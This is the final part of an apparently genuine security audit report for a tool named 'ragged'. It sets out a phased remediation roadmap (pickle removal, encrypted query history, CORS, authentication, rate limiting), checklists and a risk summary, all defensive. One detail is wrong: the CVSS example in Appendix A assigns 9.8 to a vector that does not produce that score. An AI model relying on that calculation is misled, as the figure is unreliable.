**Installed Versions (from pip list)**:
- `pydantic==2.12.4` - ✓ Up to date (latest 2.x)
- `sentence-transformers==5.1.2` - ✓ Recent

**Recommendation**:

1. **Run automated security scans**:
   ```bash
   pip install safety
   safety check

   pip install pip-audit
   pip-audit
   ```

2. **Monitor advisories** for:
   - `chromadb` - Database vulnerabilities
   - `gradio` - UI framework security
   - `pymupdf` - PDF parsing (historical vulnerabilities)

3. **Add Dependabot** (GitHub) for automated dependency updates

### Transitive Dependencies

**High-Risk Areas**:
- PyMuPDF dependencies (complex PDF parsing)
- ChromaDB dependencies (vector database internals)
- Gradio dependencies (web framework)

**Recommendation**: Audit transitive dependencies quarterly

---

## Remediation Roadmap

### Phase 1: Critical Security Fixes (v0.2.10)

**Priority**: IMMEDIATE
**Estimated Effort**: 2-3 days

1. **Replace Pickle Serialisation** (CRITICAL-001)
   - Checkpoints: Migrate to JSON + gzip
   - Embeddings: Migrate to numpy `.npy`
   - Add data migration script for existing users
   - Test: ~4 hours

2. **Encrypt Query History** (CRITICAL-002)
   - Implement AES-256 encryption
   - Add consent mechanism
   - Migrate existing history (decrypt → encrypt)
   - Test: ~3 hours

3. **Fix CORS Configuration** (HIGH-002)
   - Restrict to specific origins
   - Document allowed origins configuration
   - Test: ~1 hour

4. **Add Input Validation to Upload** (HIGH-003)
   - Use existing security utilities
   - Add magic byte validation
   - Enforce size limits
   - Test: ~2 hours

---

### Phase 2: Privacy Infrastructure (v0.2.11)

**Priority**: HIGH
**Estimated Effort**: 3-4 days

1. **Session Isolation in Caches** (CRITICAL-003)
   - Add user/session identifiers to cache keys
   - Implement cache isolation modes
   - Test: ~4 hours

2. **Implement API Authentication** (HIGH-001)
   - Add optional API key authentication
   - Environment variable configuration
   - Documentation
   - Test: ~6 hours

3. **Add Rate Limiting** (MEDIUM-002)
   - Implement SlowAPI middleware
   - Configurable limits per endpoint
   - Test: ~2 hours

4. **Sanitise Logging** (HIGH-005)
   - Remove query text from logs
   - Hash sensitive data
   - Add privacy documentation
   - Test: ~2 hours

---

### Phase 3: Hardening (v0.2.12+)

**Priority**: MEDIUM
**Estimated Effort**: 2-3 days

1. **Path Traversal Prevention** (HIGH-004)
   - Apply safe_join consistently
   - Audit all file operations
   - Test: ~3 hours

2. **Security Headers** (LOW-001)
   - Add security header middleware
   - Test: ~1 hour

3. **Error Handling Improvements** (HIGH-006)
   - Generic error messages to clients
   - Detailed logging internally
   - Test: ~2 hours

4. **Security Testing**
   - Implement security test suite
   - Add to CI/CD
   - Test: ~4 hours

---

### Phase 4: Compliance & Documentation (Ongoing)

1. **Security Documentation**
   - Deployment security guide
   - Privacy policy template
   - Incident response procedures

2. **Dependency Monitoring**
   - Add Dependabot
   - Monthly security audits
   - CVE monitoring

3. **Privacy Compliance**
   - GDPR compliance checklist
   - Data retention policies
   - User rights implementation

---

## Post-Remediation Verification Checklist

After v0.2.10/v0.2.11 implementation, verify:

- [ ] No pickle usage in codebase (`grep -r "pickle" src/`)
- [ ] Query history encrypted at rest
- [ ] CORS restricted to specific origins
- [ ] API authentication available (opt-in)
- [ ] Rate limiting active on all endpoints
- [ ] File uploads validated (magic bytes + size)
- [ ] Logs sanitised (no query text in DEBUG)
- [ ] Security tests passing
- [ ] Documentation updated

**Comparison Metrics**:

| Metric | Pre-v0.2.10 | Target v0.2.11 |
|--------|-------------|----------------|
| CRITICAL issues | 3 | 0 |
| HIGH issues | 6 | 0-1 |
| Query history encryption | ✗ | ✓ |
| API authentication | ✗ | ✓ (opt-in) |
| Rate limiting | ✗ | ✓ |
| Pickle usage | 2 files | 0 |

---

## Conclusion

### Summary

ragged v0.2.8 demonstrates **good security awareness** (telemetry disabled, privacy-first intent, path validation utilities) but has **critical vulnerabilities** that must be addressed before production deployment:

1. **Pickle deserialisation** enables arbitrary code execution
2. **Unencrypted query history** violates privacy principles
3. **No authentication** leaves API completely open
4. **Missing session isolation** creates multi-user risks

### Risk Assessment

**Current State**: **HIGH RISK** for production deployment

**After v0.2.10/v0.2.11**: **MEDIUM RISK** (residual risks from architecture)

**After v0.2.12+**: **LOW RISK** (acceptable for production with documented mitigations)

### Recommendations

**Immediate Actions** (before any production deployment):
1. Implement v0.2.10 security fixes (pickle, encryption, CORS)
2. Implement v0.2.11 privacy infrastructure (authentication, rate limiting)
3. Document security requirements for deployment
4. Add security testing to CI/CD

**Long-term Improvements**:
1. Implement comprehensive audit logging
2. Add anomaly detection for unusual query patterns
3. Consider zero-knowledge architecture for maximum privacy
4. Regular third-party security audits

### Acknowledgements

This audit identified issues before production deployment, demonstrating the value of proactive security reviews. The development team has already planned remediation in v0.2.10/v0.2.11, showing strong security awareness.

---

**Audit Completed**: 2025-11-19
**Next Review**: After v0.2.11 implementation
**Contact**: Security issues should be reported per SECURITY.md guidelines

---

## Appendix A: CVSS Score Methodology

CVSS v3.1 scores calculated based on:
- **Attack Vector (AV)**: Network, Adjacent, Local, Physical
- **Attack Complexity (AC)**: Low, High
- **Privileges Required (PR)**: None, Low, High
- **User Interaction (UI)**: None, Required
- **Scope (S)**: Unchanged, Changed
- **Confidentiality (C)**: None, Low, High
- **Integrity (I)**: None, Low, High
- **Availability (A)**: None, Low, High

Example (CRITICAL-001):
- AV:L (Local), AC:L (Low), PR:N (None), UI:N (None), S:C (Changed), C:H, I:H, A:H = CVSS 9.8

---

## Appendix B: Security Testing Checklist

```markdown
### Pre-Deployment Security Checklist

Authentication & Authorisation:
- [ ] API authentication implemented
- [ ] Rate limiting active
- [ ] CORS properly configured
- [ ] Session management secure

Input Validation:
- [ ] File uploads validated (magic bytes)
- [ ] Path traversal prevented
- [ ] Query parameters sanitised
- [ ] Metadata filters validated

Data Protection:
- [ ] Query history encrypted
- [ ] Sensitive data not logged
- [ ] Temporary files cleaned up
- [ ] File permissions restrictive

Serialisation:
- [ ] No pickle usage
- [ ] Safe serialisation formats only
- [ ] Data integrity verification

Infrastructure:
- [ ] Security headers present
- [ ] Error messages sanitised
- [ ] Dependency vulnerabilities checked
- [ ] Security tests passing
```

---

**END OF REPORT**
